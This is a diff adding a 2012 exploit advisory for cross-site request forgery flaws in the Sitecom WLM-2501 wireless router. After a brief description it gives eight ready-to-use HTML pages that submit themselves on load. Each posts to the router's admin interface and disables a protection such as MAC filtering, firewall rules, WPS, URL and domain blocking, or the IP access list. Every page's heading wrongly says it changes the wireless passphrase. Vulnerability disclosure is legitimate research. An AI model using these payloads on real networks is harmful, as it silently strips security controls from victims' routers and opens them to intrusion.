@@ -1,0 +1,146 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title    : Sitecom WLM-2501 new Multiple CSRF Vulnerabilities
+# Date             : 22-03-2012
+# Author           : Ivano Binetti (http://www.ivanobinetti.com)
+# Vendor site      : http://www.sitecom.com/wireless-modem-router-300n/p/859
+# Version          : WLM-2501
+# Tested on        : WLM-2501 (All Sitecom WL series might be is affected by these vulnerabilities)
+# Original Advisory: http://www.webapp-security.com/?p=75
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+ 3.1 Disable Mac Filtering
+ 3.2 Disable IP/Port Filtering
+ 3.3 Disable Port Forwarding
+ 3.4 Disable Wireless Access Control
+ 3.5 Disable Wi-Fi Protected Setup
+ 3.6 Disable URL Blocking Filter
+ 3.7 Disable Domain Blocking Filter
+ 3.8 Disable IP Address ACL Filter
+
++--------------------------------------------------------------------------------------------------------------------------------+
+
+1)Introduction 
+Sitecom WLM-2501 is a Wireless Modem Router 300N which uses a web management interface - listening to default on tcp/ip port 80
+- and "admin" as default administrator. His default ip address is 192.168.0.1.
+
+
+2)Vulnerability Description
+The web interface of this router is affected by muktiple CSRF vulnerabilities which allows to change the following router's 
+parameters:
+ - Disable Mac Filtering
+ - Disable/Modify IP/Port Filtering 
+ - Disable/Modify Port Forwarding
+ - Disable/Modify Wireless Access Control
+ - Disable Wi-Fi Protected Setup 
+ - Disable/Modify URL Blocking Filter
+ - Disable/Modify Domain Blocking Filter
+ - Disable/Modify IP Address ACL
+ - Change Wireless Passphrase
+ - Enable/Modify Remote Access (also on WAN interface)
+
+
+3)Exploit 
+ 3.1 Disable Mac Filtering
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/admin/formFilter">
+ <input type="hidden" name="outAct" value="1"/>
+ <input type="hidden" name="inAct" value="1"/>
+ <input type="hidden" name="setMacDft" value="Apply"/>
+ <input type="hidden" name="submit-url" value="/fw-macfilter.asp"/>
+ </form>
+ </body>
+ </html>
+ 3.2 Disable IP/Port Filtering
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/formFilter">
+ <input type="hidden" name="outAct" value="1"/>
+ <input type="hidden" name="inAct" value="1"/>
+ <input type="hidden" name="setDefaultAction" value="Apply"/>
+ <input type="hidden" name="submit-url" value="/fw-ipportfilter.asp"/>
+ </form>
+ </body>
+ </html>
+ 3.3 Disable Port Forwarding
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/formPortFw">
+ <input type="hidden" name="portFwcap" value="0"/>
+ <input type="hidden" name="apply" value="Apply"/>
+ <input type="hidden" name="select_id" value=""/>
+ <input type="hidden" name="submit-url" value="/fw-portfw.asp"/>
+ </form>
+ </body>
+ </html>
+ 3.4 Disable Wireless Access Control
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/admin/formWlAc">
+ <input type="hidden" name="wlanAcEnabled" value="0"/>
+ <input type="hidden" name="setFilterMode" value="Apply"/>
+ <input type="hidden" name="submit-url" value="/wlactrl.asp"/>
+ </form>
+ </body>
+ </html>
+ 3.5 Disable Wi-Fi Protected Setup
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/formWsc">
+ <input type="hidden" name="wlanDisabled" value="OFF"/>
+ <input type="hidden" name="disableWPS" value="ON"/>
+ <input type="hidden" name="submit-url" value="/wlwps.asp"/>
+ <input type="hidden" name="save" value="Apply"/>
+ </form>
+ </body>
+ </html>
+ 3.6 Disable URL Blocking Filter
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/formURL">
+ <input type="hidden" name="urlcap" value="0"/>
+ <input type="hidden" name="apply" value="Apply"/>
+ <input type="hidden" name="urlFQDN" value=""/>
+ <input type="hidden" name="Keywd" value=""/>
+ <input type="hidden" name="submit-url" value="/url_blocking.asp"/>
+ </form>
+ </body>
+ </html>
+ 3.7 Disable Domain Blocking Filter
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/formDOMAINBLK">
+ <input type="hidden" name="domainblkcap" value="0"/>
+ <input type="hidden" name="apply" value="Apply"/>
+ <input type="hidden" name="blkDomain" value=""/>
+ <input type="hidden" name="submit-url" value="/domainblk.asp"/>
+ </form>
+ </body>
+ </html>
+ 3.8 Disable IP Address ACL Filter
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change Wireless Passphrase</H2>
+ <form method="POST" name="form0" action="http://192.168.0.1:80/goform/admin/formACL">
+ <input type="hidden" name="lan_ip" value="192.168.0.1"/>
+ <input type="hidden" name="lan_mask" value="255.255.255.0"/>
+ <input type="hidden" name="aclcap" value="0"/>
+ <input type="hidden" name="apply" value="Apply"/>
+ <input type="hidden" name="enable" value="1"/>
+ <input type="hidden" name="interface" value="0"/>
+ <input type="hidden" name="aclIP" value=""/>
+ <input type="hidden" name="aclMask" value=""/>
+ <input type="hidden" name="submit-url" value="/acl.asp"/>
+ </form>
+ </body>
+ </html> 
++--------------------------------------------------------------------------------------------------------------------------------+
